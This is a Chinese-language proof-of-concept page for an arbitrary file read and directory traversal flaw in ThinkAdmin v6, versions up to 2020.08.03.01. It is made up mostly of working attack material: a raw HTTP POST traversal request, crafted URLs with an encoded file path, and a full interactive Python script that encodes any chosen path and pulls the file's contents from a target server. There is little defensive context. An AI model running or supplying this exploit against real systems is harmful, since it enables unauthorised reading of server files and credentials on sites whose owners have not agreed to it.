# ThinkAdminV6 任意文件操作

> 2020.9

## #影响范围

ThinkAdmin ≤ 2020.08.03.01

## #Poc

1.目录遍历

```http
POST /admin.html?s=admin/api.Update/node HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

rules=%5B%22.%2F%22%5D
```

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxwtto5dwj320x0u0qbm.jpg)

2.任意文件读取

```
http://x.x.x.x/admin.html?s=admin/api.Update/version # s参数
```

3.读取指定的文件(需要编码)

```
http://x.x.x.x/admin.html?s=admin/api.Update/get/encode/filename(encode)

http://x.x.x.x/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34
```

文件加密脚本：

python3 poc.py http://x.x.x.x

```python
import requests,json,base64,sys

def baseN(num, b):
  return ((num == 0) and "0") or \
     (baseN(num // b, b).lstrip("0") + "0123456789abcdefghijklmnopqrstuvwxyz"[num % b])

def poc(url):
	while 1:
		s = input("请输入需要读取的文件路径：").encode('utf-8')

		if str(s) == "b'exit'":
			sys.exit(0)

		try:
			poc =""
			for i in s:
				poc += baseN(i,36)

			url = url+"/admin.html?s=admin/api.Update/get/encode/"+poc
			r = requests.get(url)
			if r.status_code == 200:
				if "读取文件内容失败！" in r.text:
					print("读取文件内容失败，请输入正确的文件路径！")

				s1 = json.loads(r.text)["data"]["content"]
				result = base64.b64decode(s1).decode('utf-8')
				print(result)
			else:
				print("不存在漏洞")
				break
		except:
			pass

if __name__ == "__main__":
	if len(sys.argv) == 2:
		poc(sys.argv[1])
	else:
		print("""
 _____ _     _       _     ___      _           _       
|_   _| |   (_)     | |   / _ \    | |         (_)      
  | | | |__  _ _ __ | | _/ /_\ \ __| |_ __ ___  _ _ __  
  | | | '_ \| | '_ \| |/ /  _  |/ _` | '_ ` _ \| | '_ \ 
  | | | | | | | | | |   <| | | | (_| | | | | | | | | | |
  \_/ |_| |_|_|_| |_|_|\_\_| |_/\__,_|_| |_| |_|_|_| |_| v6
                                                        
By: yuyan-sec \t [ThinkAdmin v6 任意文件读取]

Usage： python poc.py [URL]
	python poc.py http://127.0.0.1
			""")
	

```

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxx9jvs2yj314006j0t1.jpg)

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxx9r16y1j31hc0m27bm.jpg)

跨目录读取

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxx8dfn53j313y05vjrv.jpg)

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxx8k93k8j31hb0ecmyn.jpg)

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxx8xe57xj31hc0g33zt.jpg)